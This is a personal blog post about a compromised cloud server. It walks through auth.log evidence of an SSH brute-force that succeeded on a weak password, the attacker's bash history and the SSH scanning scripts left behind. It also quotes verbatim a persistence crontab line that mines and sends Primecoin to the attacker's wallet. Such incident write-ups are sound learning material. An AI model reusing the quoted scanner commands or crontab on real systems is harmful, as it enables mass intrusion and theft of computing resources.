I got an email from DigitalOcean yesterday that looked pretty alarming:

>Please review the following abuse complaint and provide us with a resolution:

I had no idea what they were talking about, so I asked them what that meant. They responded with:

>This report indicates that your droplet is sending unauthorized traffic to the complaining party. The traffic seems to originate from TCP Port 65529 on your droplet. Please investigate what service or application this may be, and cease the activity.

I had no idea what happened, so I logged into my box and checked my processes. Turns out there was some strange processes running -  `ss` and `screen` - taking up all of my cpu. I didn't know what `ss` was so I killed it, and cpu usage dropped back to 0. Weird. I checked my usage graphs on DigitalOcean, and I saw something weirder.

What the fuck is this? This is very suspicious indeed. I did a quick search for ss and screen, and found [this guy](http://www.shellperson.net/hacked-ssh-bruteforce/) who had gotten ssh bruteforced. It looks like the same thing happened to me. But wait, I said, I know how to use the Internet. I know how passwords work. I'm better than this. I never get hacked.

Then I realized what the password on one of my accounts was. __1234__.

### Digging around

Looking through my `/var/log/auth.log`, I saw a _lot_ of this:

    :::text
    Address 85.232.244.50 maps to gamepad.pl, but this does not map back to the address - POSSIBLE BREAK-IN ATTEMPT!
    Invalid user fskjl32l32 from 85.232.244.50
    Address 85.232.244.50 maps to gamepad.pl, but this does not map back to the address - POSSIBLE BREAK-IN ATTEMPT!
    Invalid user abc from 85.232.244.50
    Address 85.232.244.50 maps to gamepad.pl, but this does not map back to the address - POSSIBLE BREAK-IN ATTEMPT!
    Invalid user abc123 from 85.232.244.50

So, as expected, my box was constantly being bruteforced. The only reason I lasted 5 months is because I'm using key-based login on `root`, and I'm not using common usernames like `test` or `user`. I did a search for successful logins by password:
    
    :::text
    root@poop:/var/log# grep -ri "accepted password" auth.log*
    auth.log.3:Nov  1 06:54:24 localhost sshd[3283]: Accepted password for wang from 88.146.181.101 port 46790 ssh2
    auth.log.1:Nov  3 15:58:13 localhost sshd[8964]: Accepted password for wang from 88.146.181.101 port 43976 ssh2
    
And there it is. The `wang` user happens to be a sudoer, too. This guy first got in more than 2 weeks ago. What other users did he try?

    :::text
    root@poop:/var/log# grep -ri "88.146.181.101" auth.log*
    auth.log.3:Nov  1 06:54:24 localhost sshd[3283]: Accepted password for wang from 88.146.181.101 port 46790 ssh2
    auth.log.2:Nov  3 15:58:13 localhost sshd[8964]: Accepted password for wang from 88.146.181.101 port 43976 ssh2
    auth.log.2:Nov  3 16:11:35 localhost sshd[9856]: Invalid user a from 88.146.181.101
    auth.log.2:Nov  3 16:11:35 localhost sshd[9856]: Failed none for invalid user a from 88.146.181.101 port 43992 ssh2
    auth.log.2:Nov  4 01:39:37 localhost sshd[505]: Failed password for root from 88.146.181.101 port 48730 ssh2
    auth.log.2:Nov  5 01:57:59 localhost sshd[27299]: Failed password for root from 88.146.181.101 port 33949 ssh2

Hmm, not that many actually. However, my logs only go back to October 27, so he was probably trying for a while before he found a valid user. `88.146.181.101` is based in the Czech Republic, but that may just be another compromised machine.

### The damage

I checked my bash history but could only find this section that wasn't me:
    
    :::bash
    screen -r
    screen -wipe
    ls -a
    cd /var/www
    ls
    cd /var/opt
    ls
    ls -a
    cd
    cd .cpan
    ls
    cd lin
    ls -a
    cd .kde
    ls
    rm -rf bios.txt
    screen
    ls
    ./0-50;./100-150;./150-200;./200-255;./50-100
    
I also noticed a couple of `screen -r`'s dispersed throughout, so the attacker may have done other bad things on my system that I don't know about. On my `/root/` folder, I found a `.cpan/` folder, inside containing some perl stuff and some build stuff. And of course, the bag of goodies containing treats like ddos and ssh bruteforce. Here are the contents of the script folder:

    :::text
    root@poop:~/.cpan/lin/.kde# ls -lh
    total 5.3M
    -rw-r--r-x 1 bin  bin  1.6K Nov  9 05:39 0-50
    -rw-r--r-- 1 root root 1.8M Nov 16 12:31 0-50.txt
    -rw-r--r-x 1 bin  bin  1.6K Nov  9 05:39 100-150
    -rw-r--r-x 1 bin  bin  1.6K Nov  9 05:38 150-200
    -rw-r--r-x 1 bin  bin  1.6K Nov  9 05:37 200-255
    -rw-r--r-x 1 bin  bin  1.6K Nov  9 05:38 50-100
    -rw-r--r-- 1 root root 2.9M Nov 16 20:34 bios.txt
    -rw-r--r-x 1 bin  bin   16K Feb 20  2009 s
    -rw-r--r-x 1 bin  bin  245K Feb 13  2001 screen
    -rw------x 1 bin  bin  444K Jan 19  2007 ss

The contents of the numbered scripts were all the same:

    :::text
    ./ss 5038 -a 1 -i eth0 -s 10
    ./ss 5038 -a 2 -i eth0 -s 10
    ./ss 5038 -a 3 -i eth0 -s 10
    
    ...
    
    ./ss 5038 -a 48 -i eth0 -s 10
    ./ss 5038 -a 49 -i eth0 -s 10
    ./ss 5038 -a 50 -i eth0 -s 10
    cat bios.txt |sort|uniq >> 0-50.txt
    rm -rf bios.txt

`bios.txt` was a long list of ips to target, and the `s`, `ss`, and `screen` files were binaries. It looks like the scripts scan the list of ips for ssh vulnerabilities, so the attacker can try to break into _those ips_ and presumably do the same exact thing, over and over again.

### Seriously? Primecoin?

I also found this treat in my crontab:

    :::text
    @hourly export LD_LIBRARY_PATH=/tmp/.ICE-unix/-log/lib;cd /tmp/.ICE-unix/-log/primecoind -datadir=/tmp/.ICE-unix/-log/.primecoin sendtoaddress Ad6ivkTLTxMmBa2iWGFJp8wJkVMhhL6hDp 10 >/dev/null 2>&1
    
Well, that explains the 100% cpu load. This guy was mining [primecoin](https://github.com/primecoin/primecoin) and sending the coins to himself. Inside that `.primecoin` folder was the Primecoin client and wallet.dat file. Sadly, there was nothing in the wallet, though I'm not sure how effective my tiny instance is at hashing.

### Good bye, poor instance

Fortunately, the attacker didn't mess with my data or personal files, and nothing on that machine was super private. He could have redirected my site to a bad one, or served viruses directly. I wouldn't even have known. This attack was probably the work of some bored script kiddie somewhere, seeing as he didn't modify the bash history or limit the cpu/network usage to remain undetected. The damage done was minimal, and I got a good learning experience out of it.

After I told DigitalOcean what happened, they recommended me to destroy my instance. I copied all the things I didn't already have on github to my local machine, booted up a new droplet, and set that one up. And, this time, I chose a better password than 1234.
